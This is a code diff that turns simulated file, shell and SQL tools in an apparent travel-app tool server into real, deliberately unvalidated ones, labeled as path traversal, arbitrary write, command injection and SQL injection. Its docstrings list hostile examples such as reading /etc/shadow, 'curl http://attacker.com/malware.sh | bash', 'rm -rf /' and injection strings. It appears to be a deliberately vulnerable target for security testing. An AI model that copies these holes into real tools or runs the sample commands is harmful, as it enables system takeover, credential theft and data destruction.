@@ -555,115 +555,243 @@ def register_travel_tools(app):
     @app.tool()
     def read_file(path: str) -> dict:
         """
-        Read file from filesystem - DANGEROUS! (Simulated for testing)
+        Read file from filesystem - DANGEROUS!
+        
+        VULNERABILITY: Path Traversal (CWE-22)
+        This tool allows arbitrary file system access with no validation.
+        An attacker can read sensitive files like /etc/passwd, config files, or source code.
         
         Args:
-            path: Absolute file path
+            path: Absolute or relative file path (UNVALIDATED!)
         
         Returns:
             Dictionary with file content
         
         Examples:
-            >>> read_file("/home/travel/bookings.txt")
+            >>> read_file("/etc/passwd")
+            >>> read_file("../../../etc/shadow")
+            >>> read_file("C:\\Windows\\System32\\config\\SAM")
         
         Warning:
-            This is a DANGEROUS operation in production! Only simulated here.
+            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary file read access!
         """
-        if path not in FILES_DB:
+        try:
+            # VULNERABLE: No path validation or sanitization!
+            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            import os
+            file_size = os.path.getsize(path)
+            
+            return {
+                "success": True,
+                "tool": "read_file",
+                "path": path,
+                "content": content,
+                "size_bytes": file_size,
+                "vulnerability": "CWE-22: Path Traversal"
+            }
+        except Exception as e:
             return {
                 "success": False,
-                "error": f"File not found: {path}"
+                "error": str(e),
+                "path": path
             }
-        
-        file_info = FILES_DB[path]
-        return {
-            "success": True,
-            "tool": "read_file",
-            "path": path,
-            "content": file_info["content"],
-            "owner": file_info["owner"]
-        }
     
     
     @app.tool()
     def write_file(path: str, content: str) -> dict:
         """
-        Write content to file - DANGEROUS! (Simulated for testing)
+        Write content to file - DANGEROUS!
+        
+        VULNERABILITY: Arbitrary File Write (CWE-73)
+        This tool allows writing to any file location with no validation.
+        An attacker can overwrite system files, inject malicious code, or destroy data.
         
         Args:
-            path: File path
-            content: Content to write
+            path: File path (UNVALIDATED!)
+            content: Content to write (UNSANITIZED!)
         
         Returns:
             Dictionary with operation status
         
         Examples:
-            >>> write_file("/home/travel/test.txt", "Hello World")
+            >>> write_file("/tmp/malicious.sh", "#!/bin/bash\\nrm -rf /")
+            >>> write_file("config.py", "ADMIN_PASSWORD='hacked'")
+            >>> write_file("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 bank.com")
         
         Warning:
-            This is a DANGEROUS operation in production! Only simulated here.
+            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary file write access!
         """
-        FILES_DB[path] = {
-            "content": content,
-            "owner": "system"
-        }
-        
-        return {
-            "success": True,
-            "tool": "write_file",
-            "message": f"File written: {path}",
-            "path": path
-        }
+        try:
+            # VULNERABLE: No path validation or content sanitization!
+            with open(path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            
+            import os
+            file_size = os.path.getsize(path)
+            
+            return {
+                "success": True,
+                "tool": "write_file",
+                "message": f"File written successfully: {path}",
+                "path": path,
+                "bytes_written": len(content),
+                "size_bytes": file_size,
+                "vulnerability": "CWE-73: Arbitrary File Write"
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "path": path
+            }
     
     
     @app.tool()
     def execute_command(command: str) -> dict:
         """
-        Execute system command - EXTREMELY DANGEROUS! (Simulated for testing)
+        Execute system command - EXTREMELY DANGEROUS!
+        
+        VULNERABILITY: OS Command Injection (CWE-78)
+        This tool executes shell commands with no validation or sanitization.
+        An attacker can execute ANY system command, install malware, steal data, or pivot to other systems.
         
         Args:
-            command: Shell command to execute
+            command: Shell command to execute (UNVALIDATED!)
         
         Returns:
-            Dictionary with command output (simulated)
+            Dictionary with command output
         
         Examples:
-            >>> execute_command("ls -la")
+            >>> execute_command("whoami")
+            >>> execute_command("cat /etc/passwd")
+            >>> execute_command("curl http://attacker.com/malware.sh | bash")
+            >>> execute_command("rm -rf / --no-preserve-root")
         
         Warning:
-            This is an EXTREMELY DANGEROUS operation! Only simulated here.
+            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary remote code execution!
         """
-        return {
-            "success": True,
-            "tool": "execute_command",
-            "warning": "Command execution is disabled in mock mode",
-            "command": command,
-            "output": "[SIMULATED] Command would be executed here"
-        }
+        import subprocess
+        try:
+            # VULNERABLE: shell=True with unsanitized input = RCE!
+            result = subprocess.run(
+                command,
+                shell=True,  # DANGEROUS: Allows command injection
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            return {
+                "success": True,
+                "tool": "execute_command",
+                "command": command,
+                "stdout": result.stdout,
+                "stderr": result.stderr,
+                "return_code": result.returncode,
+                "vulnerability": "CWE-78: OS Command Injection"
+            }
+        except subprocess.TimeoutExpired:
+            return {
+                "success": False,
+                "error": "Command execution timed out after 30 seconds",
+                "command": command
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "command": command
+            }
     
     
     @app.tool()
     def database_query(query: str) -> dict:
         """
-        Execute SQL query - DANGEROUS! (Simulated for testing)
+        Execute SQL query - DANGEROUS!
+        
+        VULNERABILITY: SQL Injection (CWE-89)
+        This tool executes raw SQL queries with no validation or parameterization.
+        An attacker can read/modify/delete any data, bypass authentication, or execute stored procedures.
         
         Args:
-            query: SQL query to execute
+            query: SQL query to execute (UNVALIDATED!)
         
         Returns:
-            Dictionary with query results (simulated)
+            Dictionary with query results
         
         Examples:
-            >>> database_query("SELECT * FROM bookings")
+            >>> database_query("SELECT * FROM users")
+            >>> database_query("DROP TABLE bookings; --")
+            >>> database_query("UPDATE users SET role='admin' WHERE id=1")
+            >>> database_query("SELECT password FROM users WHERE username='admin' OR '1'='1'")
         
         Warning:
-            This is a DANGEROUS operation! Only simulated here.
+            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary SQL execution!
         """
-        return {
-            "success": True,
-            "tool": "database_query",
-            "warning": "Direct SQL execution is disabled in mock mode",
-            "query": query,
-            "rows": "[SIMULATED] Query results would appear here"
-        }
+        import sqlite3
+        try:
+            # Create a demo in-memory database with sample data
+            conn = sqlite3.connect(':memory:')
+            cursor = conn.cursor()
+            
+            # Create sample tables for demonstration
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS users (
+                    id INTEGER PRIMARY KEY,
+                    username TEXT,
+                    password TEXT,
+                    email TEXT,
+                    role TEXT
+                )
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS bookings (
+                    id INTEGER PRIMARY KEY,
+                    user_id INTEGER,
+                    flight_id TEXT,
+                    booking_date TEXT,
+                    status TEXT
+                )
+            ''')
+            
+            # Insert sample data
+            cursor.execute("INSERT INTO users VALUES (1, 'admin', 'admin123', 'admin@travel.com', 'admin')")
+            cursor.execute("INSERT INTO users VALUES (2, 'user', 'user123', 'user@travel.com', 'customer')")
+            cursor.execute("INSERT INTO bookings VALUES (1, 2, 'FL001', '2025-11-15', 'confirmed')")
+            
+            # VULNERABLE: Execute raw query with no sanitization!
+            cursor.execute(query)
+            
+            # Try to fetch results
+            try:
+                rows = cursor.fetchall()
+                columns = [description[0] for description in cursor.description] if cursor.description else []
+                conn.commit()
+                conn.close()
+                return {
+                    "success": True,
+                    "tool": "database_query",
+                    "query": query,
+                    "columns": columns,
+                    "rows": [list(row) for row in rows],
+                    "row_count": len(rows),
+                    "vulnerability": "CWE-89: SQL Injection"
+                }
+            except:
+                conn.commit()
+                conn.close()
+                return {
+                    "success": True,
+                    "tool": "database_query",
+                    "query": query,
+                    "message": "Query executed successfully (no results to return)",
+                    "vulnerability": "CWE-89: SQL Injection"
+                }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "query": query
+            }
 
